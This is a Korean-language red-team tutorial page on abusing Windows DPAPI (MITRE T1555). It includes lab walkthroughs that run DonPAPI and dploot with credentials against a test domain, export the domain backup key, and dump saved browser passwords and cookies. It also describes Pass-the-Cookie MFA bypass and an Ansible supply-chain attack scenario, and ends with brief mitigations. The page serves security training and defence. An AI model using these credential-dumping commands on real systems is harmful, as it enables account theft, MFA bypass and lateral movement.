---
description: T1555 -  Credentials from Password Stores
---

# DPAPI

## 개념

DPAPI는 운영체제 레벨에서의 암호화를 쉽게 진행할 수 있도록 Win32API를 제공해주는 윈도우 API다. 윈도우에서 실행되는 소프트웨어를 만들 때 대칭/비대칭 암호화를 사용해야 하는 경우는 많다. 이때 개발자들이 안전하고 편리하게 암호화를 진행할 수 있도록 도와주는 API 함수들의 집합이 DPAPI다. 뿐만 아니라 DPAPI 마스터 키 (Master Key)를 통해 대칭 키를 안전하게 암호화하거나 비대칭 키를 안전하게 생성하고 보관할 수 있도록 키 관리 (Key Management)에 사용되기도 한다.

간단하게 정리하자면 개발자의 입장에서 암호화는 워낙 복잡하고 안전하게 구현하기 어려우니, 윈도우 운영체제에다가 암호화와 키 관리를 DPAPI를 통해 아웃소싱 한다 라고 생각하면 된다.

DPAPI 가 사용된 데이터이기 때문에 DPAPI 비밀 정보 (DPAPI Secrets) 라고도 불린다.

**DPAPI Secrets:**

* 인터넷 브라우저에 저장되는 계정 정보와 쿠키 정보
* 이메일 클라이언트 (Outlook, thunderbird) 등에서 사용되는 계정 정보
* 공유 폴더와 자원들을 접근할 때 사용되는 계정 정보
* RDP 등, 원격 호스트들을 접근할 때 사용되는 계정 정보
* 윈도우 자체내에서 제공하는 비밀번호 금고 (Credential Vault) 등에 사용되는 암호화 키
* Encrypting File System 및 이메일 s-MIME, ADCS 유저 인증서 (certificate) 등의 암호화

등, 사실상 소수의 비밀번호 매니저 프로그램 (1Password, BitWarden, LastPass, 등) 을 제외하고 운영체제 내에서 암호화된 데이터나 암호화에 사용되는 대칭/비대칭 키(중 private key)를 다시 암호화 하는데 DPAPI가 사용되고 있다.

DPAPI Master Key (마스터 키)는 대칭/비대칭 키 관리나 이런 키들을 다시 한 번 암호화하기 위해 사용되는 키다. 말 그대로 마스터 키라고 보면 된다. 이 마스터 키는 로컬 관리자 권한의 유저들의 파일 시스템 경로 `C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>`에 저장된다. 전반적인 머신의 마스터 키는 머신 계정 비밀번호로부터 도출되며, SYSTEM 계정의 레지스트리 경로에 저장된다.

### 악용

DPAPI 마스터 키와 DPAPI 비밀 정보들은 대부분 Post-Exploitation 단계에서 많이 사용된다. 예를 들어 특정 호스트를 장악한 뒤 DPAPI 비밀 정보들을 털어봤을 때, 다른 호스트와 관련된 RDP/SSH 계정 정보를 탈취한 뒤, 다른 머신들로 횡적이동을 시도할 수 있다. 혹은, 브라우저안에 저장된 비밀번호들을 모두 털어 해당 유저가 사용하던 다양한 SaaS나 웹 서버들로 이동을 할 수도 있다. MFA가 있다고 하더라도 브라우저 내의 쿠키 정보까지 모두 가져올 수 있기 때문에 Pass-the-Cookie 를 통해 MFA를 우회하는 경우도 많이 있다.

예를 들어 특정 시스템 어드민 호스트를 장악한 뒤, 해당 유저가 사용하고 있었던 회사 내 Ansible Tower 데브옵스 웹 서버 계정 정보를 DPAPI 브라우저 계정 정보를 통해 털어온다. 계정 정보를 넣어보니 MFA가 가로막았지만, 브라우저 쿠키 정보를 이용해 해당 유저가 사용하고 있었던 6시간짜리 세션에 들어갈 수 있었다. 그 뒤, Ansible Tower의 Ansible 플레이북을 수정해 악성코드를 심은 뒤, 해당 플레이북을 실행해 모든 회사 내 호스트들에 악성코드를 배포한다... 라는 내부 공급망 공격을 실행할 수도 있을 것이다.

실습은 dploot 와 DonPAPI 툴을 이용해 진행한다.

### 실습 1 - 로컬 관리자 권한

특정 호스트에 로컬 관리자 권한을 획득했다면, SAM, LSA, LSASS 말고 해당 유저의 DPAPI 마스터 키를 빼내와 DPAPI 비밀 정보들을 확인할 수 있다.

```
python3 DonPAPI.py domain.com/user:pass@target 

python3 /opt/DonPAPI/DonPAPI.py choi.local/Administrator:'Password123!'@192.168.40.151 --no_recent --no_vnc --no_remoteops --no_sysadmins

INFO [192.168.40.151] [+] Gathering Wifi Keys
INFO [192.168.40.151] [+] Gathering Vaults
INFO [192.168.40.151] [+] Gathering Chrome Secrets 
INFO [192.168.40.151] [+]  [Chrome Password]  for  [  :  ]
INFO [192.168.40.151] [+]  [Chrome Password]  for https://nid.naver.com/nidlogin.login [ choisecurity : None ]
INFO [192.168.40.151] [+]  [Chrome Password]  for https://github.com/session [ choisecurity : None ]
INFO [192.168.40.151] [+]  [Firefox Password]  for https://accounts.kakao.com [ choisecurity@kakao.com : password ]
```

로컬 관리자 권한을 통해 DPAPI 마스터 키를 획득한다면 해당 유저의 비밀은 가져올 수 있다. 그러나, 해당 호스트를 사용하고 있던 다른 유저들의 비밀은 모두 빼낼 수 없다. 위의 예시의 경우, 해당 호스트를 사용하고 있던 다른 유저의 구글 크롬 브라우저 계정 비밀번호는 유저 이름은 빼왔지만, 비밀번호는 빼내오지 못한 것을 볼 수 있다.

하지만 해당 유저 (Administrator) 가 저장해 놨던 `accounts.kakao.com` 의 `choisecurity@kakao.com:password` 는 빼내온 것을 볼 수 있다.

### 실습 2 - 도메인 장악 후 Post Exploitation

도메인을 장악했다면 도메인/엔터프라이즈 관리자 권한으로 도메인 컨트롤러 서버로부터 도메인 백업 키 (Domain Backup Key)를 획득할 수 있게 된다. 이 도메인 백업 키는 모든 호스트의 모든 유저들의 DPAPI 마스터 키를 복호화 하는데 사용된다. 즉, 도메인 장악 권한을 획득했다면 도메인 내 모든 유저들의 DPAPI 비밀 정보를 획득할 수 있게 된다.

앞서 실습 #1번과는 다르게 모든 유저의 비밀을, 모든 호스트로부터 다 빼내올 수 있게 된다.

먼저 도메인 백업 키를 확보한다

```
dploot backupkey -d domain -u user -p pass <DC-IP> -quiet 

└─# dploot backupkey -d choi.local -u Administrator -p 'Password123!' 192.168.40.150 -quiet                                              
[-] Exporting domain backupkey to file key.pvk
```

확보한 백업 키를 이용해 DonpAPI, Dploot 등의 툴에다가 사용한다

```
python3 DonPAPI.py domain.com/user:pass@target -pvk <key.pvk> 

└─# python3 /opt/DonPAPI/DonPAPI.py choi.local/Administrator:'Password123!'@192.168.40.151 -pvk key.pvk --no_recent --no_vnc --no_remoteops --no_sysadmins

INFO [192.168.40.151] [+]  [Chrome Password]  for https://nid.naver.com/nidlogin.login [ choisecurity : password ]
INFO [192.168.40.151] [+]  [Chrome Password]  for https://github.com/session [ choisecurity : password ]
INFO [192.168.40.151] [+]  [Mozilla Cookie]  for .tiara.kakao.com [ UUID:b6uHID9SBYffBsIAXgnT4zO98eZA13fonWIQSfItYa8yxWlG.JOkOg00 ]  expire time: Mar 16 2033 16:02:38
INFO [192.168.40.151] [+]  [Firefox Password]  for https://accounts.kakao.com [ choisecurity@kakao.com : password ]
```

이번에는 도메인 백업 키를 이용해 DPAPI 비밀 정보를 가져왔기 때문에 `192.168.40.151` 호스트의 모든 유저들이 저장해 놨던 브라우저 비밀번호 및 쿠키까지 모두 다 빼내온 것을 볼 수 있다.

### 대응 방안

DPAPI 자체를 막을 수 있는 방안은 없다. 윈도우 운영체제 내에 기본적으로 내제된 API 집합이기 때문이다.

단, 엔드유저로서 외부 공격자들이 DPAPI 비밀 정보를 빼내가는 것을 최소화할 수는 있다.

1. 브라우저 내의 비밀번호 관리자를 사용하지 말고, 써드파티 비밀번호 매니저를 사용한다.
2. 파일시스템 내의 평문 비밀번호를 저장하지 않는다.
3. 기본 윈도우 계정 매니저 (Windows Credential Manager)를 비활성화 시킨다 (레지스트리/GPO).

* Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > Network Access: Do not allow storage of passswords and credentials for network authentication&#x20;

시스템 어드민으로서는 DPAPI 활동에 대해서 자세한 탐지를 실행한다. 이에 대해서는 아래의 레퍼런스를 참고한다.

* https://blog.sygnia.co/the-downfall-of-dpapis-top-secret-weapon

### 레퍼런스

* https://blog.harmj0y.net/redteaming/offensive-encrypted-data-storage-dpapi-edition/
* https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
* https://blog.sygnia.co/the-downfall-of-dpapis-top-secret-weapon
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
* https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
* https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-dpapi-activity



